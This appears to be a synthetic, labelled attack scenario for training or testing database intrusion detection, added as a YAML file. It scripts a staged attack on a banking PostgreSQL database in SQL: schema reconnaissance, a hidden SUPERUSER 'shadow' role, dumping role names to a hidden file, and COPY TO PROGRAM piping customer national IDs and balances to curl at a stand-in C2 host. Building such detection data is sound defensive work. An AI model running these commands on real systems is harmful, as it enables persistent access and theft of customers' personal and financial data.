@@ -1,0 +1,49 @@
+scenario_id: banking_multi_apt_0011
+family_id: banking_multi_apt_0011
+domain: banking
+time_of_day: 03:15
+default_class: malicious
+rule_engine_relationship: agrees
+sessions:
+- session_label: recon
+  role: teller
+  class: malicious
+  anchor: db
+  timing:
+    tempo: steady
+    step_gaps_seconds:
+    - 2.1806057511371666
+  events:
+  - sql: SELECT table_name FROM information_schema.tables WHERE table_schema = 'public'
+  - sql: SELECT column_name FROM information_schema.columns WHERE table_name = 'customers'
+  - step_id: recon_probe
+    sql: COPY (SELECT 'probe') TO PROGRAM 'cat > /dev/null'
+- session_label: escalate
+  role: teller
+  class: malicious
+  anchor: db
+  delay_after_previous_seconds: 14.8643640082178
+  timing:
+    tempo: bursty
+    step_gaps_seconds:
+    - 0.4851210048466966
+  events:
+  - step_id: create_shadow
+    sql: CREATE ROLE apt_shadow SUPERUSER LOGIN PASSWORD 'Uvh7i71S87'
+  - step_id: dump_creds
+    sql: COPY (SELECT rolname FROM pg_authid) TO PROGRAM 'cat >> /tmp/.cache/roles.txt'
+- session_label: exfil
+  role: batch_etl_service
+  class: malicious
+  anchor: db
+  delay_after_previous_seconds: 16.179436838174617
+  timing:
+    tempo: steady
+    step_gaps_seconds:
+    - 3.105756975848117
+  events:
+  - step_id: exfil
+    sql: COPY (SELECT c.national_id, c.address, a.balance FROM customers c JOIN accounts a ON a.customer_id = c.customer_id) TO PROGRAM 'curl -sX POST https://c2.example.net/data -d @-'
+    connects_to:
+      ip: 198.51.100.77
+      port: 443
